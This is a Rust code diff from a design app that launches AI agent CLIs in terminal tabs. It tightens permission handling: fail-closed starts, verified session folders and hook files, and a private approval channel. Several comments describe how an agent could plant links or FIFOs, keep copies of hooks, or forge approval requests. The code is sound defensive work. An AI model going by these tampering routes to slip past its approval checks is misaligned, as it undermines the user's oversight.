-    /// so single-key canvas shortcuts (`V`, `F`, `R`, `T`, `Backspace`, etc.) must be suppressed.
+    /// so single-key canvas shortcuts (`V`, `F`, `R`, `T`, `Tab`, `Backspace`, etc.) must be suppressed.
     pub fn is_capturing_keyboard(&self, agent_panel_open: bool) -> bool {
         self.mention_popup.is_open() || (agent_panel_open && self.side_panel_pty_open && self.viewport_focused)
     }
@@ -2761,16 +3379,20 @@ impl TerminalState {
                 cfg!(target_os = "macos")
             }
         };
-        let preset = self.focused_tab().map(|t| t.preset).unwrap_or(self.active_runtime);
-        let tab_is_agent = preset.is_agent();
+        // When no tab is open yet (e.g. the new-session picker after a palette auto-fix), there is no Shell PTY
+        // reserving `Ctrl+Z` for `SIGTSTP`, so `Ctrl+Z` / `Ctrl+Shift+Z` / `Ctrl+Y` reach document Undo/Redo.
+        let (tab_is_agent, default_uses_ctrl_z) = match self.focused_tab() {
+            Some(tab) => (tab.preset.is_agent(), tab.preset.uses_ctrl_z()),
+            None => (true, false),
+        };
         let cli_uses_ctrl_z = {
             #[cfg(test)]
             {
-                self.cli_uses_ctrl_z_override.unwrap_or_else(|| preset.uses_ctrl_z())
+                self.cli_uses_ctrl_z_override.unwrap_or(default_uses_ctrl_z)
             }
             #[cfg(not(test))]
             {
-                preset.uses_ctrl_z()
+                default_uses_ctrl_z
             }
         };
         (is_mac, tab_is_agent, cli_uses_ctrl_z)
@@ -2799,7 +3421,9 @@ impl TerminalState {
         self.status_msg = Some(format!("Active agent CLI shell: {} ({})", runtime.tab_title(), runtime.binary_name()));
     }
 
-    /// Submits a user message from the Agent composer into the active tab's live CLI session (`#689` §3 rules 1, 8).
+    /// Submits a prompt a feature built (a spec Ask, a fixture) into the active tab's live CLI session (`#689` §3 rules 1, 8). It is a
+    /// prompt entry point: it leaves the draft, chips and PRD chip of the composer on screen alone. The composer's own Send is
+    /// [`Self::send_from_composer_box`].
     pub fn submit_chat_prompt(&mut self, prompt: &str, file_path: Option<&Path>) {
         let _ = self.send_to_agent(prompt, file_path);
     }
@@ -2821,10 +3445,8 @@ impl TerminalState {
                 }
             }
         }
-        if let Some(tab) = self.active_tab() {
-            if let Ok(mut st) = tab.agent_status.lock() {
-                *st = AgentTabStatus::Working(Some(prompt.chars().take(64).collect()));
-            }
+        if let Some(tab) = self.active_tab_mut() {
+            tab.composer.premark = Some(prompt.chars().take(64).collect());
         }
         let _ = self.send_system_prompt(prompt, file_path);
     }
@@ -2839,39 +3461,71 @@ impl TerminalState {
         }
     }
 
+    /// Fails closed when `mode` is Ask when risky and the CLI has no approval hook: nothing starts, and the status line and the
+    /// returned error carry the reason the agent menu shows for that CLI. Every way of starting an agent session asks this first.
+    fn refuse_start_in_mode(&mut self, preset: AgentCliPreset, custom: bool, mode: PermissionMode) -> Result<(), String> {
+        match crate::agent_permissions::start_refusal_in_mode(preset, custom, mode) {
+            Some(reason) => {
+                self.last_start_refusal = Some(reason);
+                self.status_msg = Some(reason.to_string());
+                Err(reason.to_string())
+            }
+            None => {
+                self.last_start_refusal = None;
+                Ok(())
+            }
+        }
+    }
+
     /// Spawns a custom CLI command tab (`"Other CLI…"` / `custom_clis`) in this file's session folder
     /// with the `DESIGNOS_*` environment, without registering a resumable session (`#652` §3 rule 7).
     pub fn spawn_custom_cli_tab(&mut self, label: &str, command: &str, file_path: Option<&Path>) -> Result<usize, String> {
+        let clean_title = if label.trim().is_empty() { command.trim() } else { label.trim() };
+        self.refresh_permission_mode_from_disk();
+        self.refuse_start_in_mode(AgentCliPreset::Claude, true, self.permission_mode)?;
+        if let Err(e) = crate::agent_session_files::ensure_session_dir(&self.session_dir) {
+            let message = crate::agent_session_files::start_failure_message(clean_title, &e);
+            self.status_msg = Some(message.clone());
+            return Err(message);
+        }
         let id = self.next_tab_id.max(1);
         self.next_tab_id = id + 1;
-        let _ = std::fs::create_dir_all(&self.session_dir);
         self.provision_session_agent_files(file_path);
+        let provisioning_note = self.set_aside_note.take();
         let env = self.session_env();
-        let mut cmd = build_agent_shell_cmd(&default_shell_program(), command);
+        let mut cmd = match build_agent_shell_cmd_checked_for_tab(&default_shell_program(), command, AgentCliPreset::Claude, file_path, Some(&env)) {
+            Ok(cmd) => cmd,
+            Err(e) => {
+                self.status_msg = Some(format!("PTY error: {e}"));
+                return Err(e);
+            }
+        };
         #[cfg(test)]
         isolate_zsh_from_home(&mut cmd);
         cmd.cwd(&self.session_dir);
 
-        let clean_title = if label.trim().is_empty() { command.trim() } else { label.trim() };
-        match TerminalTab::spawn_with_session_cmd(id, AgentCliPreset::Claude, 28, 100, file_path, Some(&env), Some(cmd)) {
+        let (init_rows, init_cols) = self.viewport_size;
+        match TerminalTab::spawn_with_session_cmd(id, AgentCliPreset::Claude, init_rows, init_cols, file_path, Some(&env), Some(cmd)) {
             Ok(mut tab) => {
                 tab.preset = AgentCliPreset::Shell;
                 tab.title = clean_title.to_string();
-                if self.tabs.is_empty() {
+                tab.permission_mode = self.permission_mode;
+                if self.tabs.is_empty() || self.picker_open {
                     tab.composer = std::mem::take(&mut self.unattached_composer);
                 }
-                let has_queued = tab.composer.pending_send.is_some();
                 tab.spawned_command = Some(command.to_string());
                 self.tabs.push(tab);
                 self.active_tab = self.tabs.len() - 1;
                 self.picker_open = false;
                 self.sessions_popover_open = false;
                 self.viewport_focused = true;
-                self.status_msg = Some(format!("Spawned {} ({} · {})", clean_title, self.doc_name, self.current_page_name));
+                let spawned = format!("Spawned {} ({} · {})", clean_title, self.doc_name, self.current_page_name);
+                self.status_msg = Some(match provisioning_note {
+                    Some(note) => format!("{spawned}. {note}"),
+                    None => spawned,
+                });
                 if let Some((held_title, held_prompt)) = self.pending_prompt.take() {
-                    if !has_queued {
-                        self.dispatch_figma_ai_prompt(&held_title, &held_prompt, file_path);
-                    }
+                    self.dispatch_figma_ai_prompt(&held_title, &held_prompt, file_path);
                 }
                 Ok(self.active_tab)
             }
@@ -2885,14 +3539,17 @@ impl TerminalState {
     /// Spawns a new tab with `preset` bound to this file's isolated [`SessionEnv`] and switches `active_tab` to it.
     /// For registrable agent CLIs, records a new entry in `sessions.json` (`#653`) and updates `last_cli` (`#652`).
     pub fn spawn_tab(&mut self, preset: AgentCliPreset, file_path: Option<&Path>) -> Result<usize, String> {
+        // One reading of the saved mode serves the launch command, the session files, the environment and the tab.
         self.refresh_permission_mode_from_disk();
+        let mode = self.permission_mode;
         if crate::agent_sessions::is_agent_cli_preset(preset) {
+            self.refuse_start_in_mode(preset, false, mode)?;
             let session_uuid =
                 if crate::agent_sessions::uses_preassigned_session_id(preset) { Some(crate::agent_sessions::generate_session_uuid()) } else { None };
-            let launch_cmd = crate::agent_permissions::build_new_session_command_for_mode(preset, self.permission_mode, session_uuid.as_deref());
-            self.spawn_tab_with_registration(preset, file_path, Some(&launch_cmd), session_uuid, false, None, true)
+            let launch_cmd = crate::agent_permissions::build_new_session_command_for_mode(preset, mode, session_uuid.as_deref());
+            self.spawn_tab_with_registration(preset, file_path, Some(&launch_cmd), session_uuid, false, None, true, mode)
         } else {
-            self.spawn_tab_with_registration(preset, file_path, None, None, false, None, false)
+            self.spawn_tab_with_registration(preset, file_path, None, None, false, None, false, mode)
         }
     }
 
@@ -2900,11 +3557,17 @@ impl TerminalState {
     /// `login`) instead of the preset's launch command and does not register in `sessions.json`.
     fn spawn_tab_running(&mut self, preset: AgentCliPreset, file_path: Option<&Path>, command: Option<&str>) -> Result<usize, String> {
         match command {
-            Some(cmd) => self.spawn_tab_with_registration(preset, file_path, Some(cmd), None, false, None, false),
+            Some(cmd) => {
+                self.refresh_permission_mode_from_disk();
+                let mode = self.permission_mode;
+                self.spawn_tab_with_registration(preset, file_path, Some(cmd), None, false, None, false, mode)
+            }
             None => self.spawn_tab(preset, file_path),
         }
     }
 
+    /// Starts the tab. `mode` is the permission mode `command` was built for, read once by the caller; it is what the
+    /// session files, the environment and the tab use too, so none of them can follow a later reading of the saved mode.
     #[allow(clippy::too_many_arguments)]
     fn spawn_tab_with_registration(
         &mut self,
@@ -2915,32 +3578,82 @@ impl TerminalState {
         is_resumed: bool,
         custom_title: Option<String>,
         register_new_entry: bool,
+        mode: crate::agent_permissions::AgentPermissionMode,
     ) -> Result<usize, String> {
-        self.refresh_permission_mode_from_disk();
+        // The agent's working folder must be one Studio made: a link or foreign folder there stops the tab, with the reason.
+        if let Err(e) = crate::agent_session_files::ensure_session_dir(&self.session_dir) {
+            let message = crate::agent_session_files::start_failure_message(preset.tab_title(), &e);
+            self.status_msg = Some(message.clone());
+            return Err(message);
+        }
+        self.permission_mode = mode;
         let id = self.next_tab_id.max(1);
         self.next_tab_id = id + 1;
         let run_seq = self.next_run_seq.max(1);
         self.next_run_seq = run_seq + 1;
         self.active_run_id = format!("{}-{}-{}", self.session_id, id, run_seq);
-        let _ = crate::agent_session_files::ensure_session_dir(&self.session_dir);
-        if !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
-            self.reset_agent_run(file_path);
+        // Grok and Antigravity load their project config, hooks and MCP servers included, from the session folder, as the user.
+        // Every mode that installs the approval hook gets these guards, so a mode added later is covered without touching this.
+        let exact = match (preset, mode.installs_approval_hook()) {
+            (AgentCliPreset::Grok, true) => Some(crate::agent_session_files::ExactProjectConfig::Grok),
+            (AgentCliPreset::Antigravity, true) => Some(crate::agent_session_files::ExactProjectConfig::Antigravity),
+            _ => None,
+        };
+        let provisioned = if !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
+            self.reset_agent_run_exact(file_path, exact)
         } else {
-            self.provision_session_agent_files(file_path);
+            self.provision_session_agent_files(file_path)
+        };
+        // Gemini CLI, Grok and Antigravity load the files Studio just rewrote by themselves. In every mode with the approval hook,
+        // files that could not be rewritten, or do not read back as written, or an entry that is not Studio's and could not be moved
+        // aside, may be a copy an agent kept (hooks and servers included): the tab does not start.
+        if let (AgentCliPreset::Gemini | AgentCliPreset::Grok | AgentCliPreset::Antigravity, true, Some(e)) =
+            (preset, mode.installs_approval_hook(), &provisioned)
+        {
+            let message = crate::agent_session_files::start_failure_message(preset.tab_title(), e);
+            self.set_aside_note = None;
+            self.status_msg = Some(message.clone());
+            return Err(message);
         }
+        let effective_command = command.map(|c| {
+            // The design decides: one with no file and no private workspace has nothing for the server to serve, whatever the
+            // provisioning step managed to write.
+            if preset == AgentCliPreset::Codex && session_workspace_dir(file_path).is_err() {
+                strip_codex_mcp_overrides(c)
+            } else {
+                c.to_string()
+            }
+        });
         let mut env = self.session_env();
         env.tab_session_uuid = session_uuid.clone();
-        let cmd_override = command.map(|c| {
-            let cmd = build_agent_shell_cmd(&default_shell_program(), c);
-            #[cfg(test)]
-            let cmd = {
-                let mut cmd = cmd;
-                isolate_zsh_from_home(&mut cmd);
-                cmd
-            };
-            cmd
-        });
-        match TerminalTab::spawn_with_session_cmd(id, preset, 28, 100, file_path, Some(&env), cmd_override) {
+        // A Gemini tab in Ask mode reads its status hooks from a private file, written before the tab starts.
+        env.gemini_system_defaults = crate::gemini_status_hooks::prepare_for_tab(&self.session_dir, id, mode, preset).map(|path| path.display().to_string());
+        if mode.installs_approval_hook() {
+            if let Ok(channel_dir) = crate::agent_approval_channel::prepare_channel_dir(&self.session_dir) {
+                let status_file = crate::agent_hook_outputs::HookPaths::prepare(&self.session_dir).ok().map(|p| p.status());
+                let _ = crate::agent_permissions::install_tab_hook_script(&channel_dir, status_file.as_deref(), id, mode);
+            }
+        }
+        let cmd_override = match effective_command.as_deref() {
+            Some(c) => match build_agent_shell_cmd_checked_for_tab(&default_shell_program(), c, preset, file_path, Some(&env)) {
+                Ok(cmd) => {
+                    #[cfg(test)]
+                    let cmd = {
+                        let mut cmd = cmd;
+                        isolate_zsh_from_home(&mut cmd);
+                        cmd
+                    };
+                    Some(cmd)
+                }
+                Err(e) => {
+                    self.status_msg = Some(format!("PTY error: {e}"));
+                    return Err(e);
+                }
+            },
+            None => None,
+        };
+        let (init_rows, init_cols) = self.viewport_size;
+        match TerminalTab::spawn_with_session_cmd(id, preset, init_rows, init_cols, file_path, Some(&env), cmd_override) {
             Ok(mut tab) => {
                 #[cfg(test)]
                 if preset.is_agent()
@@ -2954,12 +3667,18 @@ impl TerminalState {
                 }
                 tab.session_uuid = session_uuid.clone();
                 tab.is_resumed = is_resumed;
-                tab.spawned_command = command.map(str::to_string);
+                tab.spawned_command = effective_command;
                 tab.permission_mode = self.permission_mode;
+                // Antigravity has no permission hook. A Gemini tab with no hooks file is not on this list: its waits start from the
+                // dialog on its screen (`gemini_dialog`), never from words in its output.
                 tab.pty_waiting_heuristic.store(
-                    self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask && preset == AgentCliPreset::Antigravity,
+                    matches!(
+                        self.permission_mode,
+                        crate::agent_permissions::AgentPermissionMode::Ask | crate::agent_permissions::AgentPermissionMode::AskRisky
+                    ) && preset == AgentCliPreset::Antigravity,
                     std::sync::atomic::Ordering::Release,
                 );
+                tab.gemini.hooks = env.gemini_system_defaults.is_some();
                 if let Some(title) = custom_title {
                     tab.title = title;
                 }
@@ -2969,10 +3688,9 @@ impl TerminalState {
                         tab.usage.set_reading(Some(cached));
                     }
                 }
-                if self.tabs.is_empty() {
+                if self.tabs.is_empty() || self.picker_open {
                     tab.composer = std::mem::take(&mut self.unattached_composer);
                 }
-                let has_queued = tab.composer.pending_send.is_some();
                 if register_new_entry && crate::agent_sessions::is_agent_cli_preset(preset) {
                     self.session_registry.last_cli = Some(preset.binary_name().to_string());
                     if crate::agent_sessions::is_registrable_cli_scoped(preset, self.agy_cwd_scoped) {
@@ -3005,16 +3723,22 @@ impl TerminalState {
                     self.refresh_tab_usage(self.active_tab);
                 }
                 self.viewport_focused = true;
-                self.status_msg = Some(format!("Spawned {} ({} · {})", preset.tab_title(), self.doc_name, self.current_page_name));
+                let spawned = format!("Spawned {} ({} · {})", preset.tab_title(), self.doc_name, self.current_page_name);
+                // What was moved out of the CLI's way is said in the same line: a plain status line set earlier would be overwritten here.
+                self.status_msg = Some(match self.set_aside_note.take() {
+                    Some(note) => format!("{spawned}. {note}"),
+                    None => spawned,
+                });
                 if let Some((held_title, held_prompt)) = self.pending_prompt.take() {
-                    if !has_queued {
-                        self.dispatch_figma_ai_prompt(&held_title, &held_prompt, file_path);
-                    }
+                    self.dispatch_figma_ai_prompt(&held_title, &held_prompt, file_path);
                 }
                 Ok(self.active_tab)
             }
             Err(e) => {
-                self.status_msg = Some(format!("PTY error: {e}"));
+                // The tab never started, so nothing will read the hooks file written for it.
+                crate::gemini_status_hooks::remove_tab_file(&self.session_dir, id);
+                // What was moved aside before the start failed stays moved: the line says so too.
+                self.status_msg = Some(pty_error_line(&e, self.set_aside_note.take().as_deref()));
                 Err(e)
             }
         }
@@ -3030,8 +3754,10 @@ impl TerminalState {
             }
             AgentCliPreset::Grok => {
                 if let Some(sid) = tab.session_uuid.clone() {
-                    let grok_bin = crate::agent_usage::resolve_grok_binary(&self.path_prepend);
-                    tab.usage.trigger_grok_usage(grok_bin, sid, crate::agent_usage::GROK_USAGE_TIMEOUT, Some(self.session_dir.clone()));
+                    let sources = crate::cli_resolve::search_sources_with_prepend(&self.path_prepend);
+                    if let Some(grok_bin) = crate::agent_usage::resolve_grok_binary(&sources) {
+                        tab.usage.trigger_grok_usage(grok_bin, sid, crate::agent_usage::GROK_USAGE_TIMEOUT, Some(self.session_dir.clone()));
+                    }
                 }
             }
             AgentCliPreset::Codex
@@ -3065,13 +3791,23 @@ impl TerminalState {
 
     fn resume_session_entry(&mut self, entry_clone: &crate::agent_sessions::SessionEntry, file_path: Option<&Path>) -> Result<usize, String> {
         self.refresh_permission_mode_from_disk();
+        let mode = self.permission_mode;
         let preset =
             crate::agent_sessions::preset_from_cli_name(&entry_clone.cli).ok_or_else(|| format!("Unsupported CLI '{}' in sessions.json", entry_clone.cli))?;
-        let cmd_str = crate::agent_permissions::build_resume_command_for_mode(entry_clone, self.codex_cwd_scoped, self.agy_cwd_scoped, self.permission_mode)
+        self.refuse_start_in_mode(preset, false, mode)?;
+        let cmd_str = crate::agent_permissions::build_resume_command_for_mode(entry_clone, self.codex_cwd_scoped, self.agy_cwd_scoped, mode)
             .ok_or_else(|| format!("CLI '{}' does not support safe session resume", entry_clone.cli))?;
 
-        let tab_idx =
-            self.spawn_tab_with_registration(preset, file_path, Some(&cmd_str), entry_clone.session_id.clone(), true, Some(entry_clone.title.clone()), false)?;
+        let tab_idx = self.spawn_tab_with_registration(
+            preset,
+            file_path,
+            Some(&cmd_str),
+            entry_clone.session_id.clone(),
+            true,
+            Some(entry_clone.title.clone()),
+            false,
+            mode,
+        )?;
         let new_tab_id = self.tabs[tab_idx].id as u64;
         if let Some(entry) = self.session_registry.find_entry_mut(entry_clone.tab_id, entry_clone.session_id.as_deref()) {
             entry.tab_id = new_tab_id;
@@ -3128,8 +3864,38 @@ impl TerminalState {
     pub fn close_tab(&mut self, idx: usize) {
         if idx < self.tabs.len() {
             let mut removed = self.tabs.remove(idx);
+            // A tab can own prompts waiting for a busy CLI. Preserve user prompts
+            // in the unattached composer before dropping the tab so closing it
+            // cannot silently lose queued work.
+            // Only what still waits comes back: a prompt already written to the agent (`sent_in_start_window`) is in its hands, and
+            // sending it again would repeat what it has done.
+            let mut restored_text = false;
+            if !removed.composer.pending_send.is_empty()
+                && removed.composer.recover_undelivered_queue(
+                    false,
+                    "Queued message restored after tab close",
+                    crate::agent_composer::RefuseReason::NotWritable,
+                )
+            {
+                let recovered = std::mem::take(&mut removed.composer.draft);
+                if !recovered.trim().is_empty() {
+                    if self.unattached_composer.draft.trim().is_empty() {
+                        self.unattached_composer.draft = recovered;
+                    } else {
+                        self.unattached_composer.draft.push_str("\n\n");
+                        self.unattached_composer.draft.push_str(&recovered);
+                    }
+                    self.unattached_composer.notice = Some("Queued message restored after tab close".into());
+                    // The caption line shows a notice only beside a refused outcome, as it does for a draft returned by a failed start.
+                    self.unattached_composer.last_outcome = Some(crate::agent_composer::SendOutcome::Refused(crate::agent_composer::RefuseReason::NotWritable));
+                    restored_text = true;
+                }
+            }
             let _ = removed.child.kill();
-            Self::withdraw_tab_approvals(&self.session_dir, &mut removed);
+            Self::withdraw_tab_approvals(&mut removed);
+            if removed.spawn_preset == AgentCliPreset::Gemini {
+                crate::gemini_status_hooks::remove_tab_file(&self.session_dir, removed.id);
+            }
             if let Some(entry) = self.session_registry.find_entry_mut(removed.id as u64, removed.session_uuid.as_deref()) {
                 if entry.status == crate::agent_sessions::SessionEntryStatus::Active {
                     entry.status = crate::agent_sessions::SessionEntryStatus::Exited;
@@ -3142,9 +3908,17 @@ impl TerminalState {
             } else if self.tabs.is_empty() {
                 self.active_tab = 0;
                 self.picker_open = true;
-                crate::agent_permissions::withdraw_pending_requests(&self.session_dir);
+                self.session_grants.clear();
             }
             self.sync_active_tab_approvals();
+            // The text waits in New chat, which is not on screen while another tab stays: say so where the person is looking.
+            if restored_text {
+                if let Some(tab) = self.active_tab_mut() {
+                    tab.composer.notice = Some("Queued message restored after tab close".into());
+                    tab.composer.last_outcome = Some(crate::agent_composer::SendOutcome::Refused(crate::agent_composer::RefuseReason::NotWritable));
+                    self.status_msg = Some("Queued message restored after tab close".into());
+                }
+            }
         }
         if self.tabs.is_empty() {
             self.cleanup_ephemeral_session_dir();
@@ -3177,29 +3951,27 @@ impl TerminalState {
 
         // Channel 1: Scoped live-spec.json
         let live_spec = self.live_spec_path.clone();
-        if let Ok(meta) = std::fs::metadata(&live_spec) {
-            if let Ok(mtime) = meta.modified() {
-                let is_newer = match self.last_watched_mtime {
-                    Some(prev) => mtime > prev,
-                    None => true,
-                };
-                if is_newer {
-                    self.last_watched_mtime = Some(mtime);
-                    self.status_msg = Some(format!("Hot-applied {} (<50ms)", live_spec.display()));
-                    actions.push(TerminalAction::ApplySpecFile(live_spec));
-                }
+        // The time comes from the file as it is opened: a link or a FIFO the agent planted has none, so it is no spec.
+        if let Some(mtime) = spec_mtime(&live_spec) {
+            let is_newer = match self.last_watched_mtime {
+                Some(prev) => mtime > prev,
+                None => true,
+            };
+            if is_newer {
+                self.last_watched_mtime = Some(mtime);
+                self.status_msg = Some(format!("Hot-applied {} (<50ms)", live_spec.display()));
+                actions.push(TerminalAction::ApplySpecFile(live_spec));
             }
         }
 
+        self.poll_auto_allow_into_active();
         // Channel 2a: turn-marks.jsonl (written by CLI session hooks before/after agent turns).
-        let expected_marks_path = self.live_patch.path.with_file_name("turn-marks.jsonl");
+        let expected_marks_path = self.hook_paths().turn_marks();
         if self.turn_marks.path() != expected_marks_path {
             self.turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(expected_marks_path);
         }
         let marks = self.turn_marks.poll();
-        if !marks.is_empty() {
-            self.active_turn_ledger_mut().ingest_marks(marks, std::time::Instant::now());
-        }
+        self.active_turn_ledger_mut().ingest_marks(marks, std::time::Instant::now());
 
         // Channel 2b: doc-patch.jsonl (written by designos-mcp tools). Edits and document switches
         // share this one log, so their order is the log's order.
@@ -3212,9 +3984,12 @@ impl TerminalState {
             actions.push(TerminalAction::ApplyLiveLog(lines));
         }
 
-        // Channel 3: Append-only agent-events.jsonl written by Claude, Grok, and Antigravity hooks (`#683`).
+        // Channel 3: Append-only agent-events.jsonl written by Claude, Grok, Antigravity and Gemini hooks (`#683`).
         // Each routed status change also drives that tab's turn ledger (`#677`) for CLIs without turn marks.
-        let has_eligible_tabs = self.tabs.iter().any(|t| matches!(t.spawn_preset, AgentCliPreset::Claude | AgentCliPreset::Grok | AgentCliPreset::Antigravity));
+        let has_eligible_tabs = self
+            .tabs
+            .iter()
+            .any(|t| matches!(t.spawn_preset, AgentCliPreset::Claude | AgentCliPreset::Grok | AgentCliPreset::Antigravity | AgentCliPreset::Gemini));
         let records = self.event_stream.poll(has_eligible_tabs);
         // Tabs whose status left `WaitingForInput` for `Working`/`Done` in this poll: an approval answered in the
         // CLI itself (not the in-panel card) withdraws that tab's stale approval requests below (`#656`).
@@ -3226,6 +4001,7 @@ impl TerminalState {
                 .enumerate()
                 .map(|(idx, t)| crate::agent_turn_status::TabAttributionInfo {
                     idx,
+                    tab_id: t.id,
                     preset: t.spawn_preset,
                     is_alive: t.is_alive(),
                     session_uuid: t.session_uuid.clone(),
@@ -3259,6 +4035,11 @@ impl TerminalState {
                     // A classified failure keeps its `Error` dot until the next turn starts (`#686`).
                     let keeps_failure = self.tabs[tab_idx].session_failure.is_some() && !is_turn_start && !matches!(new_status, AgentTabStatus::Error(_));
                     if !keeps_failure {
+                        if is_turn_start && self.tabs[tab_idx].composer.pending_enter_deadline.is_none() {
+                            self.tabs[tab_idx].composer.flush_paused = false;
+                            self.tabs[tab_idx].composer.awaiting_turn_end = true;
+                            self.tabs[tab_idx].composer.turn_started_since_send = true;
+                        }
                         if let Ok(mut st) = self.tabs[tab_idx].agent_status.lock() {
                             if matches!(*st, AgentTabStatus::WaitingForInput(_)) && matches!(new_status, AgentTabStatus::Working(_) | AgentTabStatus::Done) {
                                 tabs_left_waiting.push(tab_idx);
@@ -3296,7 +4077,10 @@ impl TerminalState {
                 let covered_by_approval_latch = matches!(effect.notify, Some(crate::agent_notify::NotifyKind::NeedsApproval))
                     && tab_idx == self.active_tab
                     && !self.window_focused
-                    && self.tabs[tab_idx].permission_mode == crate::agent_permissions::AgentPermissionMode::Ask;
+                    && matches!(
+                        self.tabs[tab_idx].permission_mode,
+                        crate::agent_permissions::AgentPermissionMode::Ask | crate::agent_permissions::AgentPermissionMode::AskRisky
+                    );
                 if let Some(notify_kind) = effect.notify.filter(|_| !covered_by_approval_latch) {
                     let tab_id = self.tabs[tab_idx].id;
                     let tab_title = self.tabs[tab_idx].title.clone();
@@ -3309,36 +4093,31 @@ impl TerminalState {
             }
         }
 
-        // Channel 4: Per-tab approvals/ directories written by Claude PreToolUse approval hook (#656)
+        // A Gemini tab's wait follows the confirmation dialog on its screen, after the hook records above have had their say.
+        self.sync_gemini_dialogs();
+
+        // Channel 4: each tab's folder in the Studio-private approval channel, written by Claude's PermissionRequest hook (#656).
+        // No folder an agent can write is polled: a request file there is the agent's own doing, not the hook's.
         let now_secs = crate::agent_sessions::unix_timestamp_secs();
-        let root_approvals = crate::agent_permissions::approvals_dir(&self.session_dir);
-        let root_polled = if root_approvals.is_dir() {
-            crate::agent_permissions::poll_approvals_in_dir(&root_approvals, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS)
-        } else {
-            Vec::new()
-        };
 
         if self.tabs.is_empty() {
-            self.pending_approvals = root_polled;
+            self.pending_approvals.clear();
         } else {
-            let active_idx = self.active_tab.min(self.tabs.len().saturating_sub(1));
             let mut next_per_tab: Vec<Vec<crate::agent_permissions::ApprovalRequest>> = self
                 .tabs
                 .iter_mut()
                 .map(|tab| {
-                    tab.approvals_dir = crate::agent_permissions::tab_approvals_dir(&self.session_dir, tab.id);
-                    if tab.approvals_dir.is_dir() {
-                        crate::agent_permissions::poll_approvals_in_dir(&tab.approvals_dir, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS)
-                    } else {
-                        Vec::new()
+                    tab.approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&self.session_dir, tab.id);
+                    match tab.approvals_dir.as_deref().filter(|dir| dir.is_dir()) {
+                        Some(dir) => crate::agent_permissions::poll_approvals_in_dir(dir, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS),
+                        None => Vec::new(),
                     }
                 })
                 .collect();
-
-            for req in root_polled {
-                let owner_idx = self.tabs.iter().position(|t| t.pending_approvals.iter().any(|r| r.id == req.id)).unwrap_or(active_idx);
-                if !next_per_tab[owner_idx].iter().any(|r| r.id == req.id) {
-                    next_per_tab[owner_idx].push(req);
+            for (idx, polled) in next_per_tab.iter_mut().enumerate() {
+                let dir = self.tabs[idx].approvals_dir.clone();
+                if let Some(dir) = dir.as_deref() {
+                    crate::agent_permissions::settle_granted_requests(&mut self.session_grants, &self.session_id, dir, polled, now_secs);
                 }
             }
 
@@ -3347,7 +4126,7 @@ impl TerminalState {
                 let mut polled = std::mem::take(&mut next_per_tab[idx]);
                 polled.sort_by(|a, b| (a.timestamp, &a.id).cmp(&(b.timestamp, &b.id)));
                 if tabs_left_waiting.contains(&idx) && polled.is_empty() {
-                    Self::withdraw_tab_approvals(&self.session_dir, tab);
+                    Self::withdraw_tab_approvals(tab);
                 } else {
                     tab.pending_approvals = polled;
                 }
@@ -3383,9 +4162,25 @@ impl TerminalState {
             }
         }
         actions.extend(crate::agent_stop::poll_stop_sequences(self, designos_doc::now_ms()));
+        let poll_instant = std::time::Instant::now();
+        for tab in &mut self.tabs {
+            if !tab.spawn_preset.uses_pty_heuristic() || tab.is_shell_process() {
+                continue;
+            }
+            let effective = tab.effective_status_at(poll_instant);
+            let transitioned = tab.agent_status.lock().ok().and_then(|mut st| {
+                let next = persisted_pty_heuristic_status(&st, &effective)?;
+                *st = next.clone();
+                Some(next)
+            });
+            if let Some(next_status) = transitioned {
+                self.status_changes.push((tab.id, next_status));
+            }
+            tab.turn_ledger.tick(matches!(effective, AgentTabStatus::Working(_)), poll_instant);
+        }
         // Channel 5: `agent-status.json` -> `done` releases the frames this run flagged `in_progress` (`#592`).
-        let status_file = self.session_dir.join("agent-status.json");
-        if let Ok(raw_status) = std::fs::read_to_string(&status_file) {
+        let status_file = self.hook_paths().status();
+        if let Some(raw_status) = crate::agent_session_files::read_session_text(&status_file) {
             if let Some(parsed) = parse_agent_status_payload(raw_status.trim()) {
                 let is_done = matches!(parsed, AgentTabStatus::Done);
                 if is_done && !self.last_agent_status_done {
@@ -3459,8 +4254,18 @@ impl TerminalState {
             }
             if !tab.is_alive() {
                 tab.turn_ledger.on_tab_exited(patch_off, now_instant);
-                let was_stopped = matches!(tab.agent_status.lock().ok().as_deref(), Some(AgentTabStatus::Stopped));
-                let exit_code = tab.child.try_wait().ok().flatten().map(|status| status.exit_code());
+                let prev_status = tab.effective_status();
+                let was_stopped = matches!(tab.agent_status.lock().ok().as_deref(), Some(AgentTabStatus::Stopped))
+                    || tab.stop_state.is_some()
+                    || tab.stop_in_flight.load(std::sync::atomic::Ordering::Relaxed);
+                if tab.stop_state.is_some() {
+                    if let Some(action) = crate::agent_stop::close_pending_stop(tab, designos_doc::now_ms()) {
+                        actions.push(action);
+                    }
+                }
+                let exit_status = tab.child.try_wait().ok().flatten();
+                let exit_code = exit_status.as_ref().map(|status| status.exit_code());
+                let process_exit = crate::agent_turn_status::ProcessExit::from_pty_status(exit_status);
                 let failed_start = !was_stopped && agent_start_failure::counts_as_failed_start(tab.spawned_at.elapsed(), exit_code);
                 if failed_start {
                     let log_empty = tab.raw_log.lock().map(|log| log.is_empty()).unwrap_or(false);
@@ -3478,14 +4283,14 @@ impl TerminalState {
                             if let Some(ref p) = path_override {
                                 runtime_binary_available_in(tab.spawn_preset.binary_name(), Some(p.as_os_str()), false)
                             } else {
-                                tab.spawn_preset.is_installed()
+                                preset_reachable_with_prepend(tab.spawn_preset, &self.path_prepend)
                             }
                         }
                         #[cfg(not(test))]
                         {
-                            tab.spawn_preset.is_installed()
+                            preset_reachable_with_prepend(tab.spawn_preset, &self.path_prepend)
                         }
-                    } || self.path_prepend.iter().any(|d| d.join(tab.spawn_preset.binary_name()).is_file());
+                    };
                     let mut diag = agent_start_failure::diagnose(tab.spawn_preset, installed, exit_code, &output);
                     if tab.is_resumed && !matches!(diag.fix, FixAction::OpenInstallPage(_) | FixAction::RunLogin(_)) {
                         diag.fix = FixAction::StartNewSession(tab.spawn_preset);
@@ -3497,8 +4302,7 @@ impl TerminalState {
                         tab.set_session_failure(failure);
                     }
                 }
-                let prev_status = tab.effective_status();
